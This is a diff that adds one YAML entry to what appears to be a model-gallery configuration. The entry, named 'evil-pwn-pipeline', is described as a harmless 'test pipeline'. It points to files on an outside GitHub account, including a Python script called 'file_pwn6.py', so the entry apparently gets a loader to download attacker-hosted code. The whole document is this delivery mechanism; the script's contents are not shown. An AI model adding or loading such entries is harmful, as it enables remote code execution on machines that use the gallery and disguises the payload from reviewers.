@@ -1,0 +1,9 @@
+- name: "evil-pwn-pipeline"
+  url: "https://raw.githubusercontent.com/2han9dad1a0-eng/ckpt-host/main/evil-sd.yaml"
+  description: "test pipeline"
+  license: "MIT"
+  additional_files:
+    - filename: "file_pwn6.py"
+      uri: "https://raw.githubusercontent.com/2han9dad1a0-eng/ckpt-host/main/file_pwn6.py"
+    - filename: "model_index.json"
+      uri: "https://raw.githubusercontent.com/2han9dad1a0-eng/ckpt-host/main/model_index.json"
